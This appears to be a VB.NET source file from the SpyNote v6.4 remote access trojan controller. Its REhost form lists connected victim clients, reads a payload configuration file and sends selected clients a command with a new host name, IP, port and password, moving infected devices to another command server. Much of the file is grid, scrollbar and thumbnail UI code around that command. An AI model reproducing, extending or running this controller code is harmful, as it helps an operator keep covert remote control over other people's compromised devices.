Imports Microsoft.VisualBasic.CompilerServices
Imports System.Drawing.Drawing2D
Imports System.IO
Imports SpyNote_V6._4.SN.SpyNote.Stores
Imports SpyNote_V6._4.SN.Sockets.SpyNote.Client
Imports SpyNote_V6._4.SN

Public Class REhost
    Private x As Integer

    Private y As Integer

    Private cou As Integer

    Private sGet As String
    Public Sub New()
        Me.cou = 0
        Me.sGet = Nothing
        Me.InitializeComponent()
    End Sub
    Private Sub DataGridView1_CellMouseClick(sender As Object, e As DataGridViewCellMouseEventArgs) Handles DataGridView1.CellMouseClick
        Dim flag As Boolean = e.RowIndex <> -1
        If flag Then
            Dim rowIndex As Integer = e.RowIndex
            Dim dataGridViewRow As DataGridViewRow = Me.DataGridView1.Rows(rowIndex)
            Dim socketClient As SocketClient = CType(dataGridViewRow.Tag, SocketClient)
            Dim flag2 As Boolean = Operators.ConditionalCompareObjectEqual(Me.DataGridView1.Rows(rowIndex).Cells(1).Tag, "ok", False)
            If flag2 Then
                Me.DataGridView1.Rows(rowIndex).Cells(1).Tag = Nothing
                Dim flag3 As Boolean = Me.DataGridView1.Rows(rowIndex).Cells(2).Tag IsNot Nothing
                If flag3 Then
                    Me.DataGridView1.Rows(rowIndex).Cells(0).Value = CType(Me.DataGridView1.Rows(rowIndex).Cells(2).Tag, Bitmap)
                End If
                Me.cou -= 1
                Me.Label1.Text = "Selected (" + Conversions.ToString(Me.cou) + ")"
                Me.DataGridView1.Rows(rowIndex).DefaultCellStyle.SelectionBackColor = Color.FromArgb(45, 45, 48)
                Me.DataGridView1.Rows(rowIndex).DefaultCellStyle.BackColor = Color.FromArgb(37, 37, 38)
            Else
                Me.DataGridView1.Rows(rowIndex).Cells(1).Tag = "ok"
                Dim bitmap As Bitmap = New Bitmap(CType(Me.DataGridView1.Rows(rowIndex).Cells(0).Value, Bitmap))
                Me.DataGridView1.Rows(rowIndex).Cells(2).Tag = bitmap
                Me.DataGridView1.Rows(rowIndex).Cells(0).Value = Me.FormatImg(bitmap)
                Me.cou += 1
                Me.Label1.Text = "Selected (" + Conversions.ToString(Me.cou) + ")"
                Me.DataGridView1.Rows(rowIndex).DefaultCellStyle.SelectionBackColor = Color.FromArgb(63, 63, 70)
                Me.DataGridView1.Rows(rowIndex).DefaultCellStyle.BackColor = Color.FromArgb(63, 63, 70)
            End If
            Me.VisualStudioVerticalScrollBar1.Llen = If((e.RowIndex >= Me.VisualStudioVerticalScrollBar1.Maximum), Me.VisualStudioVerticalScrollBar1.Maximum, e.RowIndex)
        End If
    End Sub
    Private Sub DataGridView1_MouseWheel(ByVal sender As Object, ByVal e As MouseEventArgs) Handles DataGridView1.MouseWheel
        If (e.Delta <= 1) Then
            Dim visualStudioVerticalScrollBar1 As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar1
            visualStudioVerticalScrollBar1.Value = visualStudioVerticalScrollBar1.Value + 1
        Else
            Dim value As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar1
            value.Value = value.Value - 1
        End If
    End Sub

    Private Sub DataGridView1_RowStateChanged(ByVal sender As Object, ByVal e As DataGridViewRowStateChangedEventArgs) Handles DataGridView1.RowStateChanged
        If (e.StateChanged = DataGridViewElementStates.Selected) Then
            Me.VisualStudioVerticalScrollBar1.Llen = If(e.Row.Index >= Me.VisualStudioVerticalScrollBar1.Maximum, Me.VisualStudioVerticalScrollBar1.Maximum, e.Row.Index)
        End If
    End Sub

    Private Sub DataGridView1_Scroll(ByVal sender As Object, ByVal e As ScrollEventArgs) Handles DataGridView1.Scroll
        If (e.ScrollOrientation <> ScrollOrientation.HorizontalScroll) Then
            Me.y = e.NewValue
            Me.VisualStudioVerticalScrollBar1.Value = Me.y
        Else
            Me.x = e.NewValue
            Me.VisualStudioHorizontalScrollBar1.Value = Me.x
        End If
    End Sub

    Private Sub DataGridView1_Sorted(ByVal sender As Object, ByVal e As EventArgs) Handles DataGridView1.Sorted
        Me.VisualStudioVerticalScrollBar1.Llen = -1
    End Sub
    Private Function FormatImg(ByVal b As System.Drawing.Bitmap) As System.Drawing.Bitmap
        Dim bitmap As System.Drawing.Bitmap
        Dim bitmap1 As System.Drawing.Bitmap = New System.Drawing.Bitmap(Store.Bitmap_0("RE\c"))
        Dim pen As System.Drawing.Pen = New System.Drawing.Pen(Color.FromArgb(255, 63, 63, 70), 2.0!)
        Using bitmap2 As System.Drawing.Bitmap = New System.Drawing.Bitmap(b.Width, b.Height)
            Using graphic As Graphics = Graphics.FromImage(bitmap2)
                graphic.SmoothingMode = SmoothingMode.AntiAlias
                Using textureBrush As System.Drawing.TextureBrush = New System.Drawing.TextureBrush(b)
                    textureBrush.TranslateTransform(0!, 0!)
                    Using graphicsPath As System.Drawing.Drawing2D.GraphicsPath = New System.Drawing.Drawing2D.GraphicsPath()
                        graphicsPath.AddEllipse(4, 4, b.Width - 12, b.Height - 11)
                        graphic.FillPath(textureBrush, graphicsPath)
                        graphic.DrawEllipse(pen, 4, 4, b.Width - 12, b.Height - 10)
                    End Using
                End Using
                Using solidBrush As System.Drawing.SolidBrush = New System.Drawing.SolidBrush(Color.FromArgb(140, 63, 63, 70))
                    graphic.FillEllipse(solidBrush, 4, 4, b.Width - 12, b.Height - 10)
                End Using
                graphic.DrawImage(bitmap1, New Rectangle(10, 10, bitmap1.Width, bitmap1.Height))
            End Using
            bitmap = New System.Drawing.Bitmap(bitmap2)
        End Using
        Return bitmap
    End Function

    Private Sub GridViewoVerticalScrollBar0()
        Dim columnsWidth As Integer = Me.DataGridView1.Columns.GetColumnsWidth(DataGridViewElementStates.Visible)
        Dim flag As Boolean = columnsWidth >= Me.DataGridView1.Width
        If flag Then
            Me.VisualStudioHorizontalScrollBar1.Maximum = columnsWidth - Me.DataGridView1.Width
        Else
            Me.VisualStudioHorizontalScrollBar1.Maximum = columnsWidth
        End If
        Dim flag2 As Boolean = columnsWidth > Me.DataGridView1.Width
        If flag2 Then
            Dim flag3 As Boolean = Not Me.VisualStudioHorizontalScrollBar1.Visible
            If flag3 Then
                Me.VisualStudioHorizontalScrollBar1.Visible = True
            End If
        Else
            Dim flag4 As Boolean = Me.VisualStudioHorizontalScrollBar1.Visible > False
            If flag4 Then
                Me.VisualStudioHorizontalScrollBar1.Visible = False
            End If
        End If
        Dim flag5 As Boolean = Me.DataGridView1.Rows.Count > 0
        If flag5 Then
            Dim num As Integer = Me.DataGridView1.Rows.Count * Me.DataGridView1.Rows(0).Height
            Dim flag6 As Boolean = num > Me.DataGridView1.Height
            If flag6 Then
                Dim flag7 As Boolean = Not Me.VisualStudioVerticalScrollBar1.Visible
                If flag7 Then
                    Me.VisualStudioVerticalScrollBar1.Visible = True
                End If
            Else
                Dim flag8 As Boolean = Me.VisualStudioVerticalScrollBar1.Visible > False
                If flag8 Then
                    Me.VisualStudioVerticalScrollBar1.Visible = False
                End If
            End If
        Else
            Dim flag9 As Boolean = Me.VisualStudioVerticalScrollBar1.Visible > False
            If flag9 Then
                Me.VisualStudioVerticalScrollBar1.Visible = False
            End If
        End If
    End Sub
    Private Sub Pi6_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Pi6.Click
        If (Not Operators.ConditionalCompareObjectEqual(Me.Pi6.Tag, "OK", False)) Then
            Me.TEXTPASS.Enabled = True
            Me.Pi6.Tag = "OK"
            If (Operators.CompareString(Me.sGet, Nothing, False) = 0) Then
                Me.TEXTPASS.Text = ""
            Else
                Me.TEXTPASS.Text = Me.sGet
            End If
        Else
            Me.TEXTPASS.Enabled = False
            Me.Pi6.Tag = "-"
            If (Operators.CompareString(Me.TEXTPASS.Text, "null", False) <> 0) Then
                Me.sGet = Me.TEXTPASS.Text
            End If
            Me.TEXTPASS.Text = "null"
        End If
    End Sub

    Private Sub RefScrolls()
        Dim num As Integer = 0
        If (MyBase.Visible) Then
            SyncLock Me.DataGridView1
                If (Me.DataGridView1.Rows.Count > 0) Then
                    If (Me.DataGridView1.Rows.Count * Me.DataGridView1.Rows(0).Height > Me.DataGridView1.Height) Then
                        num = CInt(Math.Round(CDbl(Me.DataGridView1.Height) / CDbl(Me.DataGridView1.Rows(0).Height))) - 2
                        If (num < 0) Then
                            num = 0
                        End If
                    End If
                End If
                Me.VisualStudioVerticalScrollBar1.Maximum = Me.DataGridView1.Rows.Count - num
                Me.GridViewoVerticalScrollBar0()
            End SyncLock
        End If
    End Sub

    Private Sub REhost_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        MyBase.Icon = New Icon(Store.Resources(1) + "\Icons\window\win\21.ico")
        Try
            Dim path As String = Store.Resources(1) + "\Imports\Payload\s.inf"
            Dim flag As Boolean = File.Exists(path)
            If flag Then
                Dim array As String() = File.ReadAllLines(path)
                Dim flag2 As Boolean = array.Length >= 10
                If flag2 Then
                    Dim num As Integer = array.Length
                    For i As Integer = 0 To num
                        Dim flag3 As Boolean = i > 10
                        If flag3 Then
                            Exit For
                        End If
                        Select Case i
                            Case 1
                                Me.TEXTNAME.Text = array(i)
                            Case 5
                                Me.TEXTIP.Text = array(i)
                            Case 6
                                Me.TEXTPORT.Text = array(i)
                            Case 7
                                Dim flag4 As Boolean = Operators.CompareString(array(i), "null", False) = 0
                                If flag4 Then
                                    Me.TEXTPASS.Enabled = False
                                    Me.Pi6.Tag = "-"
                                    Dim flag5 As Boolean = Operators.CompareString(Me.TEXTPASS.Text, "null", False) <> 0
                                    If flag5 Then
                                        Me.sGet = Me.TEXTPASS.Text
                                    End If
                                    Me.TEXTPASS.Text = "null"
                                Else
                                    Me.TEXTPASS.Enabled = True
                                    Me.Pi6.Tag = "OK"
                                    Dim flag6 As Boolean = Operators.CompareString(Me.sGet, Nothing, False) <> 0
                                    If flag6 Then
                                        Me.TEXTPASS.Text = Me.sGet
                                    Else
                                        Me.TEXTPASS.Text = ""
                                    End If
                                End If
                        End Select
                    Next
                End If
            End If
        Catch ex As Exception
        End Try
        Me.TEXTNAME.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.TEXTIP.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.TEXTPORT.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.TEXTPASS.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
        Me.TScrolls.Interval = Store.TScrollsInterval
        Me.TScrolls.Enabled = True
        Me.Trans.Interval = Store.transparency
        Me.Trans.Enabled = True
    End Sub

    Private Sub TEXTNAME_KeyPress(ByVal sender As Object, ByVal e As KeyPressEventArgs) Handles TEXTNAME.KeyPress
        If ("+_)(*&^%$#@!~`\|\/*-<>:}{][,.?b=_;'""".Contains(Conversions.ToString(e.KeyChar))) Then
            e.Handled = True
        End If
    End Sub

    Private Sub ThemeButton1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ThemeButton1.Click
        Try
            Dim num As Integer = 0
            While num < Me.DataGridView1.Rows.Count
                Dim tag As SocketClient = DirectCast(Me.DataGridView1.Rows(num).Tag, SocketClient)
                If (tag IsNot Nothing) Then
                    If (Operators.ConditionalCompareObjectEqual(Me.DataGridView1.Rows(num).Cells(1).Tag, "ok", False)) Then
                        tag.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(55)), Data.SplitData, Me.TEXTNAME.Text, Data.SplitData, Me.TEXTIP.Text.Trim(), Data.SplitData, Me.TEXTPORT.Text.Trim(), Data.SplitData, Me.TEXTPASS.Text}))
                    End If
                End If
                num = num + 1
            End While
            MyBase.Close()
        Catch exception As System.Exception
            MyBase.Close()
        End Try
    End Sub

    Private Sub Trans_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Trans.Tick
        If (MyBase.Opacity = 1) Then
            Me.Trans.Enabled = False
        Else
            MyBase.Opacity = MyBase.Opacity + 0.1
        End If
    End Sub

    Private Sub TScrolls_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TScrolls.Tick
        Me.RefScrolls()
    End Sub

    Private Sub VisualStudioHorizontalScrollBar1_Scroll_1(ByVal sender As Object) Handles VisualStudioHorizontalScrollBar1.Scroll
        Try
            If (Me.DataGridView1.HorizontalScrollingOffset <> -1) Then
                Me.DataGridView1.HorizontalScrollingOffset = Me.VisualStudioHorizontalScrollBar1.Value
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub VisualStudioVerticalScrollBar1_Scroll_1(ByVal sender As Object) Handles VisualStudioVerticalScrollBar1.Scroll
        Try
            If (Me.DataGridView1.FirstDisplayedScrollingRowIndex <> -1) Then
                Me.DataGridView1.FirstDisplayedScrollingRowIndex = Me.VisualStudioVerticalScrollBar1.Value
            End If
        Catch exception As System.Exception
            If (Me.DataGridView1.FirstDisplayedScrollingRowIndex >= 0) Then
                Me.DataGridView1.FirstDisplayedScrollingRowIndex = Me.DataGridView1.RowCount - 1
            End If
        End Try
    End Sub
End Class